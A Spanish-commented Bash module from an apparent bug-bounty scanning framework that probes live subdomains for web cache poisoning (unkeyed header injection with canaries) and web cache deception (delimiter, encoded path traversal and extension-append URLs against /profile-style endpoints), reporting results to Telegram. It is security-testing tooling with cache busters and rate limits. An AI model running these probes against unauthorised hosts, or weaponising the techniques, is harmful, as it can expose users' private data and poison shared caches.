#!/usr/bin/env bash
# ============================================================
#  modules/28_cache_attacks.sh
#  Fase 28: Web Cache Poisoning + Web Cache Deception (WCD)
#
#  Dos ataques relacionados pero distintos:
#
#  WEB CACHE POISONING — tú envenas la caché para que sirva
#  contenido malicioso a OTROS usuarios.
#  Vector: headers no incluidos en la cache key pero que
#  afectan la respuesta (X-Forwarded-Host, X-Original-URL...)
#
#  WEB CACHE DECEPTION (WCD) — engañas a la caché para que
#  almacene datos PRIVADOS de un usuario autenticado,
#  haciéndolos accesibles a cualquiera sin autenticación.
#  Vector: discrepancias en el parsing de delimiters y
#  normalización de paths entre caché y origin server.
#
#  Basado en:
#    - PortSwigger BlackHat 2024: "Gotta Cache 'em all"
#      Martin Doyhenard — portswigger.net/research/gotta-cache-em-all
#    - PortSwigger Web Security Academy — Web Cache Deception
#    - HackerOne top cache reports (Glassdoor $2000+, Twitter $2520)
#
#  Requiere: detectar presencia de caché (X-Cache, Age, CF-Cache-Status)
# ============================================================

MODULE_NAME="cache_attacks"
MODULE_DESC="Web Cache Poisoning + Web Cache Deception"

# ── Headers de caché que indican que hay una capa de caché ────
CACHE_INDICATORS=(
  "X-Cache"
  "CF-Cache-Status"
  "X-Cache-Hit"
  "X-Served-By"
  "X-Varnish"
  "Age"
  "Via"
  "X-CDN"
  "X-Fastly-Request-ID"
  "X-Amz-Cf-Pop"
)

# ── Delimiters para WCD (PortSwigger lab list) ────────────────
# Caracteres que el origin puede tratar como delimiter
# pero que la caché incluye en el cache key
WCD_DELIMITERS=(
  ";"
  "%3b"   # ; encoded
  "!"
  "%21"
  "#"
  "%23"
  "&"
  "%26"
  "+"
  "%2b"
  ","
  "%2c"
)

# ── Extensiones estáticas que triggean cache rules ────────────
STATIC_EXTENSIONS=(
  "css" "js" "png" "jpg" "jpeg" "gif" "svg"
  "ico" "woff" "woff2" "ttf" "eot"
  "json" "xml" "txt" "pdf"
)

# ── Headers no-keyed para Cache Poisoning ─────────────────────
UNKEYED_HEADERS=(
  "X-Forwarded-Host"
  "X-Host"
  "X-Forwarded-Server"
  "X-HTTP-Host-Override"
  "Forwarded"
  "X-Original-URL"
  "X-Rewrite-URL"
  "X-Forwarded-Scheme"
  "X-Forwarded-Proto"
)

# ── Cache buster único para evitar contaminar la caché ────────
_cache_buster() {
  echo "hackeadora_cb_$(date +%s%N | md5sum | cut -c1-8)"
}

# ── Detectar si hay caché activa en un host ───────────────────
_detect_cache() {
  local URL="$1"
  local PROXY_FLAG="$2"

  local HEADERS
  HEADERS=$(curl -sI --max-time 10 ${PROXY_FLAG} "$URL" 2>/dev/null)

  local CDN=""
  for INDICATOR in "${CACHE_INDICATORS[@]}"; do
    local VAL
    VAL=$(echo "$HEADERS" | grep -i "^${INDICATOR}:" | head -1 | tr -d '\r')
    if [[ -n "$VAL" ]]; then
      CDN="${CDN}|${VAL}"
    fi
  done

  # Detectar CDN específico
  local CDN_TYPE="unknown"
  echo "$HEADERS" | grep -qi "cloudflare\|CF-Cache" && CDN_TYPE="cloudflare"
  echo "$HEADERS" | grep -qi "X-Amz-Cf\|cloudfront" && CDN_TYPE="cloudfront"
  echo "$HEADERS" | grep -qi "Fastly\|X-Fastly" && CDN_TYPE="fastly"
  echo "$HEADERS" | grep -qi "Varnish\|X-Varnish" && CDN_TYPE="varnish"
  echo "$HEADERS" | grep -qi "Akamai\|X-Check-Cacheable" && CDN_TYPE="akamai"
  echo "$HEADERS" | grep -qi "X-Served-By" && CDN_TYPE="fastly_or_heroku"

  [[ -n "$CDN" ]] && echo "$CDN_TYPE" || echo ""
}

# ── Verificar si una respuesta fue cacheada ───────────────────
_is_cached() {
  local HEADERS="$1"
  echo "$HEADERS" | grep -qi "x-cache:.*hit\|cf-cache-status:.*hit\|x-cache-hit: 1\|age: [1-9]"
}

# ══════════════════════════════════════════════════════════════
#  1. WEB CACHE POISONING
#  Técnica: inyectar header no-keyed que se refleja en la resp.
#  Si la respuesta se cachea, otros usuarios reciben el payload
# ══════════════════════════════════════════════════════════════
_test_cache_poisoning() {
  local BASE_URL="$1"
  local DOMAIN_ID="$2"
  local DOMAIN="$3"
  local PROXY_FLAG="$4"
  local CDN_TYPE="$5"

  log_info "  [Cache Poisoning] $BASE_URL (CDN: $CDN_TYPE)"

  # Cache buster para cada test — nunca contaminar la caché real
  for HEADER in "${UNKEYED_HEADERS[@]}"; do
    local CB
    CB=$(_cache_buster)
    local TEST_URL="${BASE_URL}?${CB}=1"
    local CANARY="hackeadora-poison-test.${CB}"

    local BODY STATUS RESPONSE_HEADERS
    RESPONSE_HEADERS=$(curl -sI --max-time 10 ${PROXY_FLAG} \
      -H "${HEADER}: ${CANARY}" \
      "$TEST_URL" 2>/dev/null)
    BODY=$(curl -sL --max-time 10 ${PROXY_FLAG} \
      -H "${HEADER}: ${CANARY}" \
      "$TEST_URL" 2>/dev/null | head -c 5000)
    STATUS=$(curl -sL --max-time 10 ${PROXY_FLAG} \
      -H "${HEADER}: ${CANARY}" \
      -o /dev/null -w "%{http_code}" \
      "$TEST_URL" 2>/dev/null)

    # ¿Se refleja el canary en la respuesta?
    if echo "$BODY" | grep -qF "$CANARY"; then
      log_warn "  ⚡ Cache Poisoning candidate: $HEADER reflejado en $TEST_URL"

      # Verificar si la respuesta se cacheó
      # Hacer una segunda petición SIN el header y ver si sigue el canary
      sleep 1
      local BODY2
      BODY2=$(curl -sL --max-time 10 ${PROXY_FLAG} \
        "$TEST_URL" 2>/dev/null | head -c 5000)

      if echo "$BODY2" | grep -qF "$CANARY"; then
        log_warn "  🔴 CACHE POISONING CONFIRMADO: ${HEADER} → respuesta cacheada con canary"
        db_add_finding "$DOMAIN_ID" "cache_poisoning" "high" \
          "$TEST_URL" "cache_poison:$HEADER" \
          "Header $HEADER reflejado y cacheado — canary: $CANARY (CDN: $CDN_TYPE)"

        _telegram_send "☠️ *Web Cache Poisoning CONFIRMADO*
🌐 \`${DOMAIN}\`
🔗 \`${BASE_URL}\`
📋 Header: \`${HEADER}\`
🎯 CDN: \`${CDN_TYPE}\`
💡 El header se refleja en la respuesta y se cachea
⚠️ Otros usuarios pueden recibir contenido malicioso
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
      else
        # Se refleja pero no se cachea — igual es útil saberlo
        db_add_finding "$DOMAIN_ID" "cache_poisoning" "medium" \
          "$TEST_URL" "cache_reflect:$HEADER" \
          "Header $HEADER reflejado (sin cachear) — CDN: $CDN_TYPE"
        log_info "  [info] $HEADER reflejado pero no cacheado"
      fi
    fi

    # Rate limit — no saturar
    sleep 0.5
  done

  # Nuclei templates de cache poisoning
  if command -v nuclei &>/dev/null; then
    nuclei -u "$BASE_URL" \
      -tags "cache,cache-poisoning,host-header" \
      -severity "medium,high,critical" \
      -silent -json 2>/dev/null | \
      while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TPL SEV HOST
        TPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','medium'))" 2>/dev/null)
        HOST=$(echo "$LINE"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        db_add_finding "$DOMAIN_ID" "cache_poisoning" "$SEV" \
          "$HOST" "nuclei:$TPL" "Cache poisoning: $TPL"
        log_warn "  ⚡ Nuclei cache: $TPL [$SEV] @ $HOST"
      done
  fi
}

# ══════════════════════════════════════════════════════════════
#  2. WEB CACHE DECEPTION (WCD)
#  Técnica: discrepancias de parsing entre caché y origin
#
#  Método A — Delimiter confusion (PortSwigger BH2024)
#    Origin ignora: /profile;fake.css → sirve /profile
#    Caché ve: /profile;fake.css → cachea como .css estático
#
#  Método B — Path traversal + static extension
#    /profile/..%2Fresources/style.css
#    Origin normaliza → sirve /profile
#    Caché ve extensión .css → cachea
#
#  Método C — Classic extension append
#    /profile/nonexistent.css
#    Origin ignora el segmento extra → sirve /profile
#    Caché ve .css → cachea como estático
# ══════════════════════════════════════════════════════════════
_test_cache_deception() {
  local BASE_URL="$1"
  local DOMAIN_ID="$2"
  local DOMAIN="$3"
  local PROXY_FLAG="$4"
  local CDN_TYPE="$5"

  log_info "  [Web Cache Deception] $BASE_URL"

  # Identificar endpoints dinámicos / autenticados
  # Candidatos: /profile, /account, /settings, /dashboard, /api/user...
  local DYNAMIC_PATHS
  DYNAMIC_PATHS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE_URL}%'
       AND (url LIKE '%/profile%' OR url LIKE '%/account%'
            OR url LIKE '%/settings%' OR url LIKE '%/dashboard%'
            OR url LIKE '%/user%' OR url LIKE '%/me%'
            OR url LIKE '%/api/v%' OR url LIKE '%/admin%')
     LIMIT 10;" 2>/dev/null)

  # Si no hay paths en DB, usar paths comunes
  if [[ -z "$DYNAMIC_PATHS" ]]; then
    DYNAMIC_PATHS=$(cat << PATHS
${BASE_URL}/profile
${BASE_URL}/account
${BASE_URL}/settings
${BASE_URL}/dashboard
${BASE_URL}/api/user
${BASE_URL}/api/me
${BASE_URL}/user/profile
PATHS
)
  fi

  local FOUND_WCD=false

  while IFS= read -r DYN_URL; do
    [[ -z "$DYN_URL" ]] && continue

    # Verificar que el endpoint existe y da 200 (o redirige)
    local DYN_STATUS
    DYN_STATUS=$(curl -sL --max-time 8 ${PROXY_FLAG} \
      -o /dev/null -w "%{http_code}" "$DYN_URL" 2>/dev/null)
    [[ "$DYN_STATUS" != "200" && "$DYN_STATUS" != "302" && "$DYN_STATUS" != "301" ]] && continue

    # ── MÉTODO A: Delimiter confusion ──────────────────────
    for DELIM in "${WCD_DELIMITERS[@]}"; do
      for EXT in "css" "js" "png"; do
        local CB
        CB=$(_cache_buster)
        local TEST_URL="${DYN_URL}${DELIM}${CB}.${EXT}"

        local BODY RESP_HEADERS STATUS
        STATUS=$(curl -sL --max-time 10 ${PROXY_FLAG} \
          -o /tmp/.wcd_test_$$ \
          -D /tmp/.wcd_headers_$$ \
          -w "%{http_code}" "$TEST_URL" 2>/dev/null)
        BODY=$(cat /tmp/.wcd_test_$$ 2>/dev/null | head -c 3000)
        RESP_HEADERS=$(cat /tmp/.wcd_headers_$$ 2>/dev/null)
        rm -f /tmp/.wcd_test_$$ /tmp/.wcd_headers_$$

        [[ "$STATUS" != "200" ]] && continue

        # Verificar si la respuesta contiene contenido dinámico
        # (datos de usuario, tokens, información sensible)
        local HAS_DYNAMIC=false
        echo "$BODY" | grep -qiP 'email|user|token|csrf|session|account|profile|api.?key' \
          && HAS_DYNAMIC=true

        if $HAS_DYNAMIC; then
          # Comprobar si está siendo cacheada
          if _is_cached "$RESP_HEADERS"; then
            log_warn "  ⚡ WCD CONFIRMADO (delimiter $DELIM): $TEST_URL"
            log_warn "    Contenido dinámico cacheado como estático (.${EXT})"

            db_add_finding "$DOMAIN_ID" "cache_deception" "high" \
              "$TEST_URL" "wcd_delimiter:${DELIM}" \
              "WCD: delimiter '$DELIM' → dynamic content cached as .${EXT} (CDN: $CDN_TYPE)"

            _telegram_send "💀 *Web Cache Deception CONFIRMADO*
🌐 \`${DOMAIN}\`
🔗 \`${DYN_URL}\`
🎯 Payload: \`${DELIM}${CB}.${EXT}\`
📋 CDN: \`${CDN_TYPE}\`
💡 Contenido dinámico (email/token) cacheado como .${EXT}
⚠️ Datos de usuario expuestos sin autenticación
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true

            FOUND_WCD=true
            break 2  # Basta con confirmar en este endpoint
          fi
        fi
        sleep 0.3
      done
    done

    # ── MÉTODO B: Path traversal + extensión estática ──────
    # /profile/..%2Fresources%2Fstyle.css
    # Encodemos el dot-segment para que el browser no lo resuelva
    for STATIC_DIR in "resources" "static" "assets" "css" "js"; do
      for EXT in "css" "js"; do
        local CB
        CB=$(_cache_buster)
        local TEST_URL="${DYN_URL}/..%2F${STATIC_DIR}%2F${CB}.${EXT}"

        local STATUS RESP_HEADERS BODY
        STATUS=$(curl -sL --max-time 10 ${PROXY_FLAG} \
          --path-as-is \
          -o /tmp/.wcd_b_$$ \
          -D /tmp/.wcd_bh_$$ \
          -w "%{http_code}" "$TEST_URL" 2>/dev/null)
        BODY=$(cat /tmp/.wcd_b_$$ 2>/dev/null | head -c 3000)
        RESP_HEADERS=$(cat /tmp/.wcd_bh_$$ 2>/dev/null)
        rm -f /tmp/.wcd_b_$$ /tmp/.wcd_bh_$$

        [[ "$STATUS" != "200" ]] && continue

        echo "$BODY" | grep -qiP 'email|user|token|csrf|session|account|profile' || continue
        _is_cached "$RESP_HEADERS" || continue

        log_warn "  ⚡ WCD (path traversal): $TEST_URL"
        db_add_finding "$DOMAIN_ID" "cache_deception" "high" \
          "$TEST_URL" "wcd_traversal" \
          "WCD: path traversal encoded → dynamic content cached as .${EXT}"

        _telegram_send "💀 *Web Cache Deception — Path Traversal*
🌐 \`${DOMAIN}\`
🔗 \`${TEST_URL}\`
📋 Método: encoded dot-segment + .${EXT}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true

        FOUND_WCD=true
        break 2
      done
    done

    # ── MÉTODO C: Classic extension append ────────────────
    for EXT in "css" "js" "png"; do
      local CB
      CB=$(_cache_buster)
      local TEST_URL="${DYN_URL}/${CB}.${EXT}"

      local STATUS RESP_HEADERS BODY
      STATUS=$(curl -sL --max-time 10 ${PROXY_FLAG} \
        -o /tmp/.wcd_c_$$ \
        -D /tmp/.wcd_ch_$$ \
        -w "%{http_code}" "$TEST_URL" 2>/dev/null)
      BODY=$(cat /tmp/.wcd_c_$$ 2>/dev/null | head -c 3000)
      RESP_HEADERS=$(cat /tmp/.wcd_ch_$$ 2>/dev/null)
      rm -f /tmp/.wcd_c_$$ /tmp/.wcd_ch_$$

      [[ "$STATUS" != "200" ]] && continue

      echo "$BODY" | grep -qiP 'email|user|token|csrf|session|account|profile' || continue
      _is_cached "$RESP_HEADERS" || continue

      log_warn "  ⚡ WCD (classic extension): $TEST_URL"
      db_add_finding "$DOMAIN_ID" "cache_deception" "medium" \
        "$TEST_URL" "wcd_classic" \
        "WCD clásico: /${CB}.${EXT} sirve contenido dinámico cacheado"

      _telegram_send "💀 *Web Cache Deception — Classic*
🌐 \`${DOMAIN}\`
🔗 \`${TEST_URL}\`
📋 Extensión .${EXT} → contenido dinámico cacheado
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true

      FOUND_WCD=true
      break
    done

    sleep 1  # Entre endpoints — respetuoso con el servidor

  done <<< "$DYNAMIC_PATHS"

  # Nuclei para cache deception
  if command -v nuclei &>/dev/null; then
    nuclei -u "$BASE_URL" \
      -tags "cache-deception,web-cache-deception" \
      -silent -json 2>/dev/null | \
      while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TPL SEV HOST
        TPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','medium'))" 2>/dev/null)
        HOST=$(echo "$LINE"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        db_add_finding "$DOMAIN_ID" "cache_deception" "$SEV" \
          "$HOST" "nuclei:$TPL" "Web Cache Deception: $TPL"
        log_warn "  ⚡ Nuclei WCD: $TPL [$SEV] @ $HOST"
      done
  fi

  $FOUND_WCD && return 0 || return 1
}

# ── Función principal ─────────────────────────────────────────
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 28 — $MODULE_DESC: $DOMAIN"

  source "$(dirname "$0")/../core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local FINDINGS_BEFORE
  FINDINGS_BEFORE=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID}
       AND type IN ('cache_poisoning','cache_deception');" \
    2>/dev/null || echo 0)

  local CHECKED=0 WITH_CACHE=0

  local SUBS
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND status='alive'
     ORDER BY subdomain;" 2>/dev/null)
  [[ -z "$SUBS" ]] && [[ -s "$OUT_DIR/subs_alive.txt" ]] && \
    SUBS=$(cat "$OUT_DIR/subs_alive.txt")

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    ((CHECKED++))
    local BASE="https://${SUB}"

    # ── Detectar si hay caché activa ──────────────────────
    local CDN_TYPE
    CDN_TYPE=$(_detect_cache "$BASE" "$CURL_PROXY")

    if [[ -z "$CDN_TYPE" ]]; then
      log_info "  [$CHECKED] $SUB — sin caché detectada, saltando"
      continue
    fi

    ((WITH_CACHE++))
    log_info "  [$CHECKED] $SUB — CDN/caché: $CDN_TYPE"

    # ── Web Cache Poisoning ────────────────────────────────
    _test_cache_poisoning "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY" "$CDN_TYPE"

    # ── Web Cache Deception ────────────────────────────────
    _test_cache_deception "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY" "$CDN_TYPE"

  done <<< "$SUBS"

  local FINDINGS_AFTER NEW_FINDINGS
  FINDINGS_AFTER=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID}
       AND type IN ('cache_poisoning','cache_deception');" \
    2>/dev/null || echo 0)
  NEW_FINDINGS=$(( FINDINGS_AFTER - FINDINGS_BEFORE ))

  log_ok "$MODULE_DESC: $CHECKED subdominios, $WITH_CACHE con caché, $NEW_FINDINGS findings"

  [[ "$NEW_FINDINGS" -gt 0 ]] && \
    _telegram_send "🗄️ *Cache Attacks completado*
🌐 \`${DOMAIN}\`
🔍 Con caché: \`${WITH_CACHE}/${CHECKED}\`
⚡ Findings: \`${NEW_FINDINGS}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
}
